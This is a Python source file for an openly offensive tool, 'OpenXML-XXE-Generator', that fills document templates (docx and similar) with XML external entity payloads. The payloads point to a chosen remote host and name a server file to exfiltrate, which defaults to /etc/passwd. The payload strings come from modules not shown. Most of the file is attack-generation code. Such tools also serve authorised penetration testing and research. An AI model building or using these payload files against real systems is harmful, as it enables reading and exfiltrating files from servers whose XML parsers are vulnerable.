import zipfile
import argparse
import os
import glob
import tempfile

from pl import payloads
from ft import filetypes

class XXeFile:
    def __init__(
        self, host, protocol, filetype, payload, outfile=None, exfile=None
    ):

        """
        This should be dealt with by argparse
        """
        # if not host:
        #     raise KeyError("Please specify a valid host")
        # if not protocol:
        #     raise KeyError("Please specify a valid protocol")
        # if not filetype:
        #     raise KeyError("Please specify a valid filetype")
        # if not payload:
        #     raise KeyError("Please specify a valid payload")
        # if not filetype in filetypes:
        #     raise KeyError("Please specify a valid filetype")
        # if not payload in payloads:
        #     raise KeyError("Please specify a valid payload")

        self.host = host
        self.protocol = protocol
        self.filetype = filetype
        self.template = filetypes[filetype]
        self.payload = payloads[payload]["payload"]
        self.description = payloads[payload]["description"]
        self.outfile = outfile
        self.exfile = exfile
        # Hacky - Jordy please see what else we can do
        self.entity = payloads[payload]["entity"]

    def generate_payload(self):
        tplpath = os.path.join(
            os.path.dirname(os.path.realpath(__file__)),
            self.template["template"],
        )
        finalpath = self.outfile
        print(finalpath)
        if tplpath is not None:
            if self.template["ooxml"]:
                with zipfile.ZipFile(tplpath, "r") as zip_ref:
                    tempdir = tempfile.mkdtemp(
                        suffix="payload", prefix=self.filetype + "_"
                    )
                    zip_ref.extractall(tempdir)
                    with zipfile.ZipFile(
                        finalpath, "w", zipfile.ZIP_DEFLATED
                    ) as final:
                        for fname in glob.glob(
                            tempdir + "/**/*.*", recursive=True
                        ):
                            final.write(fname, fname[len(tempdir) + 1 :])
            else:
                self.replace_payload_vars(tplpath)
        return finalpath

    def replace_payload_vars(self, tplpath):

        with open(tplpath, "r+", encoding="utf8") as tmpl:
            # Clean payload
            if "__REMOTE_HOST__" in self.payload:
                self.payload = self.payload.replace(
                    "__REMOTE_HOST__", self.host
                )
            if "__PROTOCOL__" in self.payload:
                self.payload = self.payload.replace(
                    "__PROTOCOL__", self.protocol
                )
            if "__EXFILE__" in self.payload:
                self.payload = self.payload.replace("__EXFILE__", self.exfile)

            # Replace vars in file
            tmpl.seek(0)
            tempdat = tmpl.read()
            if "__REMOTE_HOST__" in tempdat:
                tempdat = tempdat.replace(
                    "__REMOTE_HOST__", self.protocol + "://" + self.host
                )

            if "__ENTITY__" in tempdat:
                tempdat = tempdat.replace("__ENTITY__", self.entity)

            if "__PAYLOAD__" in tempdat:
                tempdat = tempdat.replace("__PAYLOAD__", self.payload)

            # Seems although we need to seek to the beginning of the file before writing to it
            tmpl.seek(0)
            tmpl.write(tempdat)
        return tempdat

    @property
    def to_file(self):
        tempdat = self.generate_payload()
        # with open(self.outfile, "wb") as out:
        # out.write(bytes(tempdat, "utf8"))

    @property
    def to_text(self):
        tempdat = self.generate_payload()
        print(tempdat)


def main():
    parser = argparse.ArgumentParser(
        description="OpenXML-XXE-Generator by Richard Clifford & Jordy Zomer"
    )
    parser.add_argument(
        "--host",
        type=str,
        required=True,
        help="The host to use in your payloads",
    )
    parser.add_argument(
        "--protocol",
        type=str,
        required=False,
        help="The protocol to use in your payloads",
        default="http://",
    )
    parser.add_argument(
        "--filetype",
        type=str,
        required=False,
        default="docx",
        help="The type to use in your payloads. Supported formats: {0}".format(
            ", ".join(list(filetypes.keys()))
        ),
    )
    parser.add_argument(
        "--payload",
        type=str,
        required=False,
        default="rdtd",
        help="The payload to use in your payloads. Supported payloads: {0}".format(
            ", ".join(list(payloads.keys()))
        ),
    )
    parser.add_argument(
        "--outfile",
        required=True,
        type=str,
        help="The resulting payload file. Generated into ./output/",
    )
    parser.add_argument(
        "--exfile",
        type=str,
        required=False,
        help="The file you want to extract",
        default="/etc/passwd",
    )
    args = parser.parse_args()

    obj = XXeFile(
        args.host,
        args.protocol,
        args.filetype,
        args.payload,
        args.outfile,
        args.exfile,
    )

    if obj.outfile is None:
        obj.to_text
    else:
        obj.to_file


if __name__ == "__main__":
    main()
